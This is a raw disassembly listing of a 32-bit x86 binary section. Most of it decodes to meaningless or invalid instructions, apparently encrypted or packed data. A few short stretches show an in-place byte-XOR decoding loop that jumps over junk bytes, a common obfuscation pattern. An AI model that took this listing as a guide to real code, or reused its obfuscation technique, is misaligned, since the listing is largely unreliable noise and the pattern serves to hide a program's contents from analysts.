  405dab:	xor    esp,DWORD PTR [edx+0x5c545720]
  405db1:	xchg   DWORD PTR [ebx-0x2f],ecx
  405db4:	xchg   ecx,eax
  405db5:	cmp    eax,0x6daf3a64
  405dba:	test   DWORD PTR [esi+edi*2-0x8],0xbc8f9c8d
  405dc2:	mov    al,0x13
  405dc4:	sub    eax,0x7d414840
  405dc9:	fwait
  405dca:	dec    edi
  405dcb:	lods   eax,DWORD PTR ds:[esi]
  405dcc:	mov    eax,0xae571d0b
  405dd1:	hlt    
  405dd2:	jnp    0x405d7b
  405dd4:	or     al,BYTE PTR [ecx+ebx*1-0x8]
  405dd8:	and    BYTE PTR [eax],bl
  405dda:	arpl   WORD PTR [ecx+0x2f],bp
  405ddd:	test   eax,0xd74ecc7b
  405de2:	adc    BYTE PTR [ecx-0x71],0xe4
  405de6:	psllw  mm5,mm0
  405de9:	adc    eax,esp
  405deb:	dec    esp
  405dec:	(bad)  
  405ded:	cli    
  405dee:	xchg   ebp,eax
  405def:	sub    al,0x76
  405df1:	adc    esp,DWORD PTR [ecx-0x2ecd4391]
  405df7:	cmc    
  405df8:	out    dx,eax
  405df9:	cs jmp 0x2847ebeb
  405dff:	sub    bh,BYTE PTR [ebx+0x7828ece6]
  405e05:	push   cs
  405e06:	pop    esi
  405e07:	xchg   ebp,eax
  405e08:	or     eax,0xc87ec22d
  405e0d:	ins    DWORD PTR es:[edi],dx
  405e0e:	sbb    DWORD PTR [ecx-0x6876a5ed],ecx
  405e14:	xchg   ebp,eax
  405e15:	retf   
  405e16:	in     al,0x79
  405e18:	mov    WORD PTR [edx+eiz*8+0x7f],ds
  405e1c:	sub    BYTE PTR [edi],bl
  405e1e:	or     BYTE PTR [edi+eiz*2+0x447367cb],ch
  405e25:	rol    edi,1
  405e27:	xchg   esi,eax
  405e28:	xor    DWORD PTR es:[ebp+0x2c],ecx
  405e2c:	push   DWORD PTR [ebx+eax*4+0x43]
  405e30:	sub    eax,0x104acca4
  405e35:	push   ebp
  405e36:	mov    esi,0x6399633a
  405e3b:	icebp  
  405e3c:	mov    bh,0x92
  405e3e:	outs   dx,BYTE PTR ds:[esi]
  405e3f:	fmul   QWORD PTR [edi+eax*2+0x61]
  405e43:	int    0xa
  405e45:	cmp    BYTE PTR [esi-0x1d],0xad
  405e49:	xchg   DWORD PTR [ebx+0x29d82dec],edx
  405e4f:	call   0x1159ddbe
  405e54:	stos   BYTE PTR es:[edi],al
  405e55:	pop    eax
  405e56:	imul   ecx,DWORD PTR [ecx],0x963ad548
  405e5c:	(bad)  
  405e5e:	int    0xfd
  405e60:	fsub   DWORD PTR [ecx+0x775e451]
  405e66:	aaa    
  405e67:	jno    0x405e8b
  405e69:	cwde   
  405e6a:	push   ss
  405e6b:	cdq    
  405e6c:	retf   0x9910
  405e6f:	fadd   st(1),st
  405e71:	add    eax,0x23594167
  405e76:	mov    esp,0xc225ebeb
  405e7b:	sub    ebx,DWORD PTR [edi-0x33890189]
  405e81:	pop    ebx
  405e82:	out    dx,al
  405e83:	das    
  405e84:	pop    edi
  405e85:	retf   0x3bdf
  405e88:	repz iret 
  405e8a:	cmp    ah,BYTE PTR [edi+0x1c]
  405e8d:	jg     0x405e9f
  405e8f:	pop    esi
  405e90:	dec    esi
  405e91:	adc    eax,esp
  405e93:	repz ss mov bl,0xe5
  405e97:	cs ret 
  405e99:	leave  
  405e9a:	int3   
  405e9b:	int    0xe2
  405e9d:	call   0xe177945b
  405ea2:	inc    edx
  405ea3:	pop    edi
  405ea4:	push   0x4123ab66
  405ea9:	push   ebp
  405eaa:	dec    ecx
  405eab:	or     al,ah
  405ead:	xor    bh,dh
  405eaf:	(bad)  
  405eb0:	idiv   DWORD PTR [ebp-0x6a]
  405eb3:	xchg   edx,eax
  405eb4:	(bad)  
  405eb5:	or     al,0x40
  405eb7:	push   cs
  405eb8:	adc    eax,0x8a426021
  405ebd:	xchg   esp,eax
  405ebe:	xchg   ebp,eax
  405ebf:	xlat   BYTE PTR ds:[ebx]
  405ec0:	ja     0x405ea6
  405ec2:	aaa    
  405ec3:	or     eax,0x86734b60
  405ec8:	mov    ebx,0x8f2483ca
  405ecd:	adc    DWORD PTR [ecx-0x1059af74],edx
  405ed3:	out    dx,al
  405ed4:	push   eax
  405ed5:	xor    edi,esi
  405ed7:	das    
  405ed8:	sub    DWORD PTR [esi+0x6a],edx
  405edb:	jnp    0x405f24
  405edd:	lds    edi,FWORD PTR [edx+0x3b9362b9]
  405ee3:	(bad)  
  405ee4:	fwait
  405ee5:	push   eax
  405ee6:	xchg   edi,eax
  405ee7:	xor    al,0x7e
  405ee9:	jmp    0x405f36
  405eeb:	(bad)  
  405eed:	cmp    al,0x78
  405eef:	addr16 inc ebx
  405ef1:	sub    al,0x89
  405ef3:	mov    ds:0x36b4626c,al
  405ef8:	cmovnp eax,ecx
  405efb:	dec    esp
  405efc:	stc    
  405efd:	xor    DWORD PTR [ebp-0x3fd8b40a],esi
  405f03:	(bad)  
  405f04:	jno    0x405e8f
  405f06:	mov    dl,0x89
  405f08:	and    ch,0xd
  405f0b:	call   0x19e192e4
  405f10:	cmc    
  405f11:	inc    ebx
  405f12:	mov    cl,cl
  405f14:	fld    DWORD PTR ds:0x2de3863a
  405f1a:	sub    ecx,DWORD PTR [eax]
  405f1c:	outs   dx,BYTE PTR ds:[esi]
  405f1d:	cwde   
  405f1e:	cwde   
  405f1f:	jo     0x405f12
  405f21:	sti    
  405f22:	fbstp  TBYTE PTR [edx]
  405f24:	not    BYTE PTR [ebp+0x49ca3c94]
  405f2a:	push   es
  405f2b:	mov    al,0xa
  405f2d:	sbb    al,0x1f
  405f2f:	and    edi,ebx
  405f31:	je     0x405f94
  405f33:	test   al,0x10
  405f35:	jle    0x405f2c
  405f37:	and    eax,0x10193a7d
  405f3c:	mov    al,0x96
  405f3e:	pop    edx
  405f3f:	mov    eax,ss:0xba454eac
  405f45:	push   eax
  405f46:	pop    esp
  405f47:	call   0xe275:0x985be57
  405f4e:	cwde   
  405f4f:	int    0x4f
  405f51:	inc    edi
  405f52:	dec    eax
  405f53:	rcl    DWORD PTR ds:0xb4639697,cl
  405f59:	jns    0x405fcf
  405f5b:	pusha  
  405f5c:	xor    ecx,0xffffffc7
  405f5f:	stos   DWORD PTR es:[edi],eax
  405f60:	jns    0x405fb2
  405f62:	outs   dx,DWORD PTR ds:[esi]
  405f63:	rol    ebp,0x64
  405f66:	xchg   esp,eax
  405f67:	loope  0x405fc7
  405f69:	and    ah,BYTE PTR [ecx]
  405f6b:	popa   
  405f6c:	outs   dx,DWORD PTR ds:[esi]
  405f6d:	mov    ebx,0xe8ad3249
  405f72:	mov    edx,0xc93789e8
  405f77:	cmp    BYTE PTR [eax+0x17],dl
  405f7a:	jo     0x405f8b
  405f7c:	repz or BYTE PTR [edx-0x2b],cl
  405f80:	lds    esp,FWORD PTR [edi+edx*4]
  405f83:	sbb    DWORD PTR [edx],edi
  405f85:	rcr    dl,0x6b
  405f88:	std    
  405f89:	mov    ds:0x6ec34047,eax
  405f8e:	in     eax,dx
  405f8f:	or     DWORD PTR [ecx+0x44],edx
  405f92:	add    BYTE PTR [edi+0x2d],dh
  405f95:	cdq    
  405f96:	xchg   ecx,eax
  405f97:	or     esi,DWORD PTR [ebx+ecx*4]
  405f9a:	loopne 0x405f33
  405f9c:	and    BYTE PTR [ecx],bl
  405f9e:	daa    
  405f9f:	mov    bl,0x41
  405fa1:	sahf   
  405fa2:	sbb    edi,0x4c
  405fa5:	test   BYTE PTR [ecx],0x91
  405fa8:	push   cs
  405fa9:	or     ah,BYTE PTR [eax+0x74302f17]
  405faf:	pop    edx
  405fb0:	jl     0x405f3d
  405fb2:	xor    esp,DWORD PTR [ecx]
  405fb4:	inc    edi
  405fb5:	and    DWORD PTR [edi-0x71],0xb5eb9627
  405fbc:	out    dx,eax
  405fbd:	sub    dh,BYTE PTR [edx]
  405fbf:	sub    eax,0xf0c50ba0
  405fc4:	stos   BYTE PTR es:[edi],al
  405fc5:	shl    BYTE PTR [esi],cl
  405fc7:	and    eax,0x887a5de5
  405fcc:	push   ebp
  405fcd:	jmp    0x735e93d8
  405fd2:	inc    edi
  405fd3:	add    al,0x23
  405fd5:	adc    edi,esi
  405fd7:	inc    ebp
  405fd8:	jns    0x40604a
  405fda:	and    edi,DWORD PTR [ebp+0x68]
  405fdd:	in     eax,0xfd
  405fdf:	out    dx,al
  405fe0:	int3   
  405fe1:	stos   DWORD PTR es:[edi],eax
  405fe2:	popa   
  405fe3:	lods   eax,DWORD PTR ds:[esi]
  405fe4:	jp     0x405f95
  405fe6:	popf   
  405fe7:	lods   al,BYTE PTR ds:[esi]
  405fe8:	sbb    DWORD PTR [edi-0x5e39b60a],0x54
  405fef:	mov    bh,0x64
  405ff1:	imul   eax,DWORD PTR [ebx],0xfffffff2
  405ff4:	mov    ds:0x85ff4610,eax
  405ff9:	mov    esi,0xd16abdc5
  405ffe:	ja     0x40605f
  406000:	adc    bh,BYTE PTR [eax]
  406002:	pop    eax
  406003:	push   0x5bf94957
  406008:	mov    ds:0xf16aac74,al
  40600d:	adc    al,0x94
  40600f:	and    DWORD PTR [ecx],edi
  406011:	das    
  406012:	sub    edx,esp
  406014:	and    bl,BYTE PTR [eax-0x2e]
  406017:	pop    ecx
  406018:	inc    ebx
  406019:	stos   DWORD PTR es:[edi],eax
  40601a:	pop    edx
  40601b:	ja     0x405fed
  40601d:	pop    ss
  40601e:	push   0xb47715f2
  406023:	pop    ecx
  406024:	jmp    0xb40e:0xcb9c4746
  40602b:	fwait
  40602c:	dec    eax
  40602d:	cmp    BYTE PTR [edi],cl
  40602f:	cld    
  406030:	lods   al,BYTE PTR ds:[esi]
  406031:	clc    
  406032:	mov    ds:0x1eebee,eax
  406037:	dec    eax
  406038:	repz test al,0x36
  40603b:	clc    
  40603c:	jb     0x406057
  40603e:	or     bh,BYTE PTR [ebx+0x1160d07a]
  406044:	pop    eax
  406045:	xchg   BYTE PTR [ebp+0x709164b9],ah
  40604b:	loopne 0x405ffd
  40604d:	les    esp,FWORD PTR [ebp-0x40333687]
  406053:	cs cmp al,0x5a
  406056:	mov    ch,0xb1
  406058:	pushf  
  406059:	pop    edi
  40605a:	mov    esp,0xa6658f2d
  40605f:	or     al,0xdb
  406061:	push   ebx
  406062:	jle    0x40602a
  406064:	mov    al,0x8d
  406066:	fndisi(8087 only) 
  406068:	jbe    0x405feb
  40606a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40606b:	add    BYTE PTR [eax+0x28],bl
  40606e:	(bad)  
  40606f:	and    eax,0x4e090857
  406074:	push   ds
  406075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406076:	sar    DWORD PTR [ebx-0x77c38108],1
  40607c:	push   ecx
  40607d:	icebp  
  40607e:	mov    ebp,0xa6338237
  406083:	cmp    BYTE PTR [ebx+0x66],ch
  406086:	repz shl esi,1
  406089:	popf   
  40608a:	sub    ebp,edx
  40608c:	xor    DWORD PTR [esi+0x10dbfd6a],ecx
  406092:	push   es
  406093:	inc    edi
  406094:	mov    dh,0xe2
  406096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406097:	mov    DWORD PTR [eax-0x7e],eax
  40609a:	sub    eax,0xcda66a11
  40609f:	pop    esp
  4060a0:	sti    
  4060a1:	mov    eax,ds:0xac53cfab
  4060a6:	fidiv  DWORD PTR [ebx]
  4060a8:	in     eax,0x28
  4060aa:	and    bh,BYTE PTR es:[ebx]
  4060ad:	fxch   st(2)
  4060af:	scas   al,BYTE PTR es:[edi]
  4060b0:	push   esp
  4060b1:	cdq    
  4060b2:	xchg   ebp,eax
  4060b3:	(bad)  
  4060b5:	inc    ebx
  4060b6:	sub    cl,BYTE PTR [edi-0x41d6b0db]
  4060bc:	mov    eax,ds:0xcc3d83be
  4060c1:	jg     0x406092
  4060c3:	sub    al,0xbf
  4060c5:	cdq    
  4060c6:	inc    esp
  4060c7:	dec    edx
  4060c8:	pushf  
  4060c9:	push   edi
  4060ca:	mov    edi,0x9a058efa
  4060cf:	shl    DWORD PTR [ecx+esi*8+0x4f],1
  4060d3:	leave  
  4060d4:	push   ebx
  4060d5:	xchg   ecx,eax
  4060d6:	gs inc ebx
  4060d8:	and    al,0x61
  4060da:	lahf   
  4060db:	xor    al,0xde
  4060dd:	dec    ebx
  4060de:	cmp    al,0x51
  4060e0:	gs pop esp
  4060e2:	mov    ?,WORD PTR [ebx]
  4060e4:	xchg   ecx,eax
  4060e5:	or     ah,BYTE PTR [ecx-0x359e5adc]
  4060eb:	jmp    0x373c15ec
  4060f0:	int    0x4b
  4060f2:	dec    edx
  4060f3:	dec    esi
  4060f4:	jp     0x4060c5
  4060f6:	cld    
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	repnz push es
  40612e:	mov    ebx,0x18a378b0
  406133:	sbb    BYTE PTR [esi+0x58181812],bl
  406139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40613a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40613b:	xor    DWORD PTR [edi+0x34],esp
  40613e:	fild   QWORD PTR [edi-0x3b16f68]
  406144:	aam    0xdd
  406146:	adc    edi,DWORD PTR [ebx-0x5f6a7011]
  40614c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40614d:	sahf   
  40614e:	push   ss
  40614f:	test   eax,0xdd5e9222
  406154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406155:	out    dx,al
  406156:	hlt    
  406157:	or     BYTE PTR [ebx+0x6],dl
  40615a:	les    esi,FWORD PTR [ebx]
  40615c:	add    dh,BYTE PTR [ebp+0xd]
  40615f:	test   al,0x84
  406161:	mov    dl,0x19
  406163:	mov    eax,0x366669f3
  406168:	cs pop ebp
  40616a:	iret   
  40616b:	push   ebx
  40616c:	ja     0x4061b2
  40616e:	test   al,0x98
  406170:	pop    esp
  406171:	jo     0x406130
  406173:	(bad)  
  406175:	arpl   WORD PTR [edi+0x66],cx
  406178:	mov    edi,0xea2be2ed
  40617d:	test   ebx,eax
  40617f:	pop    es
  406180:	jne    0x406123
  406182:	cli    
  406183:	icebp  
  406184:	push   edx
  406185:	mov    WORD PTR [eax],ds
  406187:	pop    ebp
  406188:	xlat   BYTE PTR ds:[ebx]
  406189:	pop    ebp
  40618a:	outs   dx,DWORD PTR ds:[esi]
  40618b:	xchg   DWORD PTR [ecx+0x2fd65c13],esi
  406191:	ja     0x40612c
  406193:	rcl    BYTE PTR ds:0xa04d219b,cl
  406199:	mov    esp,DWORD PTR [eax-0x63cfa3fa]
  40619f:	les    ebx,FWORD PTR [ecx+0x74]
  4061a2:	pop    edi
  4061a3:	out    0xca,eax
  4061a5:	stc    
  4061a6:	sub    al,0xda
  4061a8:	clc    
  4061a9:	(bad)  
  4061ab:	push   eax
  4061ac:	sbb    al,0xa2
  4061ae:	es inc ebx
  4061b0:	sbb    DWORD PTR [ebp+edi*1+0x3ccd79b0],0xb7a6e59d
  4061bb:	push   eax
  4061bc:	cmp    ecx,DWORD PTR [edx]
  4061be:	rol    BYTE PTR [esi-0x80],0x1a
  4061c2:	(bad)  
  4061c3:	mov    ah,0x87
  4061c5:	adc    bl,BYTE PTR gs:0x4dac148
  4061cc:	stc    
  4061cd:	popa   
  4061ce:	dec    esi
  4061cf:	popf   
  4061d0:	mov    bl,0x95
  4061d2:	xchg   edi,eax
  4061d3:	push   eax
  4061d4:	in     eax,dx
  4061d5:	repnz pop es
  4061d7:	sub    DWORD PTR [edx-0x11dd9536],esi
  4061dd:	into   
  4061de:	outs   dx,BYTE PTR ds:[esi]
  4061df:	fild   WORD PTR [ebp-0x7538a95e]
  4061e5:	xchg   ebx,eax
  4061e6:	xchg   esp,eax
  4061e7:	jno    0x40616b
  4061e9:	cmp    al,0xa
  4061eb:	popf   
  4061ec:	les    esp,FWORD PTR [edi-0x3dd80c50]
  4061f2:	mov    cs,WORD PTR [edi]
  4061f4:	xchg   edx,eax
  4061f5:	clc    
  4061f6:	fstp   QWORD PTR [esi]
  4061f8:	in     al,dx
  4061f9:	in     al,0xc0
  4061fb:	push   ebx
  4061fc:	jae    0x4061c0
  4061fe:	lahf   
  4061ff:	mov    edx,0x9f502b10
  406204:	jl     0x4061b3
  406206:	daa    
  406207:	aas    
  406208:	inc    ebx
  406209:	or     eax,0x36151e6d
  40620e:	dec    edx
  40620f:	sub    cl,dh
  406211:	ins    DWORD PTR es:[edi],dx
  406212:	jl     0x40625a
  406214:	mov    ah,0xed
  406216:	push   es
  406217:	scas   al,BYTE PTR es:[edi]
  406218:	out    0x94,al
  40621a:	mov    esi,0xf8faa219
  40621f:	and    dl,BYTE PTR [edi]
  406221:	aas    
  406222:	hlt    
  406223:	je     0x4061fc
  406225:	in     eax,0x48
  406227:	xchg   edx,eax
  406228:	stos   BYTE PTR es:[edi],al
  406229:	sub    eax,0x41959414
  40622e:	loope  0x40622c
  406230:	pop    ebx
  406231:	mov    esi,0xe02cfa8d
  406236:	pop    ebp
  406237:	leave  
  406238:	pushf  
  406239:	fiadd  WORD PTR [esi+0x3d]
  40623c:	ja     0x4061cc
  40623e:	test   BYTE PTR [ebx],ch
  406240:	or     eax,0x76d9ddb5
  406245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406246:	into   
  406247:	jno    0x4061e6
  406249:	and    eax,0x87015d85
  40624e:	ror    DWORD PTR [ebx-0x26],1
  406251:	cli    
  406252:	pop    ecx
  406253:	adc    ah,bh
  406255:	stos   DWORD PTR es:[edi],eax
  406256:	lods   eax,DWORD PTR ds:[esi]
  406257:	scas   al,BYTE PTR es:[edi]
  406258:	or     dh,BYTE PTR [edi+0x2c]
  40625b:	inc    ecx
  40625c:	nop
  40625d:	mov    eax,0x3993d1ab
  406262:	cmp    esi,DWORD PTR [eax]
  406264:	call   0x3cff:0x16b283b1
  40626b:	dec    ebx
  40626c:	pusha  
  40626d:	shr    ecx,cl
  40626f:	or     al,0xa6
  406271:	lods   al,BYTE PTR ds:[esi]
  406272:	leave  
  406273:	es pop ds
  406275:	cmp    al,0xaa
  406277:	sar    BYTE PTR [edx+eax*2-0x34],cl
  40627b:	imul   ecx,DWORD PTR [ebp-0x7e],0xc66467ef
  406282:	push   ss
  406283:	rol    BYTE PTR [edx+0x51d73102],1
  406289:	fdiv   DWORD PTR [edx+0x78bec120]
  40628f:	mov    ah,0x3d
  406291:	ret    
  406292:	mov    edx,0xc4fc3cf2
  406297:	(bad)  
  406298:	mov    ch,0xfd
  40629a:	ja     0x4062db
  40629c:	and    eax,0x53e9e1ff
  4062a1:	mov    DWORD PTR [ebp+0x7d8c7226],ecx
  4062a7:	cmp    BYTE PTR [ebx],bh
  4062a9:	mov    bl,ch
  4062ab:	xchg   DWORD PTR [eax],edx
  4062ad:	sbb    BYTE PTR [edi+0x57],bl
  4062b0:	sub    DWORD PTR fs:[esi+0x6d],edx
  4062b4:	pxor   mm0,QWORD PTR [esi+0x2cbe8390]
  4062bb:	and    BYTE PTR [ebp+0xfae2531],bl
  4062c1:	fwait
  4062c2:	sbb    ebp,eax
  4062c4:	jae    0x406310
  4062c6:	(bad)  [edi]
  4062c8:	mov    eax,ds:0x275d416e
  4062cd:	xor    al,0x81
  4062cf:	mov    ebx,0x84e3c400
  4062d4:	cmp    ecx,DWORD PTR [esi]
  4062d6:	or     edi,DWORD PTR [ebx+0x3c46575b]
  4062dc:	ud0    ebp,DWORD PTR [edi]
  4062df:	add    DWORD PTR [bx+di+0x29],0x4a
  4062e4:	(bad)  
  4062e5:	lods   al,BYTE PTR ds:[esi]
  4062e6:	mov    eax,0xb862464a
  4062eb:	or     bl,cl
  4062ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ee:	out    0xf4,eax
  4062f0:	cmp    BYTE PTR [edi],cl
  4062f2:	xor    BYTE PTR [edx-0x12069485],cl
  4062f8:	test   BYTE PTR [ebx+eiz*4],dh
  4062fb:	std    
  4062fc:	pop    esp
  4062fd:	mov    bl,0xa1
  4062ff:	mov    ss,WORD PTR [edi+0x43]
  406302:	aas    
  406303:	icebp  
  406304:	push   es
  406305:	ss pop ecx
  406307:	jl     0x406309
  406309:	ss push edi
  40630b:	lds    ecx,FWORD PTR [ecx-0x33]
  40630e:	and    DWORD PTR [ecx-0x16],0xffffffbe
  406312:	jae    0x406381
  406314:	mov    bl,0x45
  406316:	mov    DWORD PTR [edx-0x12d0b3a4],esp
  40631c:	bound  ebx,QWORD PTR [edi-0x44a47c0f]
  406322:	outs   dx,BYTE PTR ds:[esi]
  406323:	test   dh,bl
  406325:	fwait
  406326:	iret   
  406327:	(bad)  
  406328:	(bad)  
  40632a:	(bad)  
  40632b:	dec    ebp
  40632c:	mov    bl,BYTE PTR [edx+0x77d0faaa]
  406332:	jl     0x4062e2
  406334:	loop   0x406320
  406336:	les    ecx,FWORD PTR [ebx-0xd168968]
  40633c:	fadd   DWORD PTR [ebx+0x60]
  40633f:	inc    esi
  406340:	ins    DWORD PTR es:[edi],dx
  406341:	jns    0x4062c7
  406343:	js     0x4063a7
  406345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406346:	stc    
  406347:	dec    edx
  406348:	cmp    eax,0xaa042f96
  40634d:	mov    edx,0x42de6a9f
  406352:	inc    edx
  406353:	sub    ch,BYTE PTR [ecx+0x2c60bbe3]
  406359:	mov    esp,0x3395d4e5
  40635e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40635f:	pop    ebx
  406360:	and    BYTE PTR [esi],bl
  406362:	xor    esi,DWORD PTR [eax+0x3ae067c0]
  406368:	sub    al,ah
  40636a:	xchg   edi,eax
  40636b:	push   ecx
  40636c:	or     edx,DWORD PTR [esi+ecx*8+0x20]
  406370:	jmp    0xd814d616
  406375:	sbb    DWORD PTR [edx+0x2],ecx
  406378:	rol    BYTE PTR [edx+ebx*1+0x54892218],cl
  40637f:	lock jg 0x4063f6
  406382:	in     eax,0x2e
  406384:	jecxz  0x40636f
  406386:	lea    ebx,[ebx]
  406388:	fadd   st(7),st
  40638a:	(bad)  
  40638b:	out    0xa5,al
  40638d:	mov    WORD PTR [edx-0x7d],?
  406390:	jecxz  0x406368
  406392:	xor    ecx,edx
  406394:	leave  
  406395:	test   eax,0xd05cd088
  40639a:	pop    ecx
  40639b:	test   BYTE PTR [eax-0xb99747],bl
  4063a1:	cdq    
  4063a2:	jmp    0xa029:0x105ab18
  4063a9:	sbb    ebx,DWORD PTR [ebx]
  4063ab:	data16 cmp al,0x50
  4063ae:	xor    DWORD PTR [eax-0x20],0x968ea5a
  4063b5:	out    0x76,eax
  4063b7:	shr    DWORD PTR [ebp+0x68],cl
  4063ba:	lods   al,BYTE PTR ds:[esi]
  4063bb:	jb     0x406369
  4063bd:	call   0x16acf14
  4063c2:	dec    esi
  4063c3:	sbb    al,0xe
  4063c5:	or     al,0x9f
  4063c7:	sub    al,0x88
  4063c9:	pop    esi
  4063ca:	loop   0x40636b
  4063cc:	jno    0x406392
  4063ce:	mov    eax,0x915132ee
  4063d3:	jp     0x406449
  4063d5:	sbb    al,dh
  4063d7:	cdq    
  4063d8:	lds    ebp,FWORD PTR [edx-0x9e3790d]
  4063de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063df:	fdiv   st(4),st
  4063e1:	loope  0x4063ae
  4063e3:	cmp    bl,BYTE PTR [edi-0x56]
  4063e6:	push   ebx
  4063e7:	cmp    eax,0xe28731b6
  4063ec:	sbb    al,BYTE PTR [edx+0x1252fe2c]
  4063f2:	dec    esp
  4063f3:	rol    DWORD PTR [ebx+0x683989af],0x65
  4063fa:	and    BYTE PTR ds:0x4936a238,bl
  406400:	push   ebx
  406401:	mov    DWORD PTR [edi],eax
  406403:	fcomip st,st(1)
  406405:	nop
  406406:	sub    BYTE PTR [edx],cl
  406408:	sub    ah,BYTE PTR [eax-0x5e26a205]
  40640e:	push   ebp
  40640f:	cmp    eax,0x2328d054
  406414:	data16 xlat BYTE PTR ds:[ebx]
  406416:	sbb    DWORD PTR [ebx+eax*1+0x39],ecx
  40641a:	(bad)  
  40641b:	cmp    dh,dh
  40641d:	pop    ds
  40641e:	stc    
  40641f:	adc    edx,DWORD PTR [ecx]
  406421:	jno    0x40649b
  406423:	js     0x406459
  406425:	adc    al,0xee
  406427:	imul   ebp,DWORD PTR [esi+0x78],0xffffffeb
  40642b:	pop    edx
  40642c:	les    esi,FWORD PTR [ecx+eiz*4]
  40642f:	test   BYTE PTR [edx-0x544935b4],bh
  406435:	fbstp  TBYTE PTR [edi+0x3d]
  406438:	sub    ebx,DWORD PTR [edx-0xf345730]
  40643e:	pop    ds
  40643f:	sahf   
  406440:	out    0xb,al
  406442:	push   ebp
  406443:	mov    dl,BYTE PTR [edi-0x2d]
  406446:	mov    gs,esp
  406448:	(bad)  
  406449:	rol    BYTE PTR [edi+0x5f],1
  40644c:	sbb    al,0x32
  40644e:	or     al,0x32
  406450:	mov    BYTE PTR [ecx+ecx*4],cl
  406453:	mov    bh,0x59
  406455:	retf   0xda20
  406458:	int    0x2d
  40645a:	mov    cl,0x36
  40645c:	pop    ebx
  40645d:	pop    ecx
  40645e:	xchg   ecx,eax
  40645f:	ret    0xa796
  406462:	sbb    al,0x82
  406464:	fsub   DWORD PTR [edi-0x7f]
  406467:	and    al,0x94
  406469:	dec    esp
  40646a:	adc    BYTE PTR [esi+0x50],ah
  40646d:	lds    edx,FWORD PTR ds:0xa17fc7fc
  406473:	rcr    bl,0x59
  406476:	out    0xa0,al
  406478:	gs dec ebp
  40647a:	adc    al,0xdf
  40647c:	out    0x5f,eax
  40647e:	fsub   DWORD PTR [esi]
  406480:	lds    edi,FWORD PTR [esi]
  406482:	cwde   
  406483:	ss cwde 
  406485:	ins    BYTE PTR es:[edi],dx
  406486:	fiadd  WORD PTR [edx-0x4c632fd9]
  40648c:	in     eax,0xc2
  40648e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40648f:	cld    
  406490:	popa   
  406491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406492:	add    dh,bl
  406494:	xchg   BYTE PTR [edx-0x4a416e49],bh
  40649a:	repz pop eax
  40649c:	test   eax,0x157c1ae2
  4064a1:	sbb    eax,DWORD PTR [ecx-0x55]
  4064a4:	bound  edx,QWORD PTR [edi+ebx*8+0x7b]
  4064a8:	sub    BYTE PTR [eax+0x4],0x5
  4064ac:	dec    eax
  4064ad:	mov    bh,BYTE PTR [edx+0x22]
  4064b0:	jb     0x4064d8
  4064b2:	sub    eax,0x1fb3c383
  4064b7:	lock and esi,esp
  4064ba:	stos   DWORD PTR es:[edi],eax
  4064bb:	ret    0x1997
  4064be:	sub    DWORD PTR [eax],eax
  4064c0:	push   ebx
  4064c1:	push   edi
  4064c2:	pop    ecx
  4064c3:	sub    eax,0x81710ac5
  4064c8:	call   0xc0e191fe
  4064cd:	push   esp
  4064ce:	scas   al,BYTE PTR es:[edi]
  4064cf:	add    BYTE PTR [ecx-0x92abc8a],bh
  4064d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d6:	mov    bl,0xd0
  4064d8:	adc    ecx,DWORD PTR [edx-0x382ac285]
  4064de:	adc    al,0xfe
  4064e0:	xlat   BYTE PTR ds:[ebx]
  4064e1:	xor    dl,ah
  4064e3:	adc    ebp,DWORD PTR [edi-0x6dd6cfe]
  4064e9:	xor    al,0x3f
  4064eb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4064ed:	retf   
  4064ee:	jmp    0x406497
  4064f0:	adc    al,bh
  4064f2:	jnp    0x406520
  4064f4:	jno    0x40652d
  4064f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064f7:	sbb    BYTE PTR [ebp+0xb],0xc2
  4064fb:	mov    cl,BYTE PTR [eax+ecx*1]
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
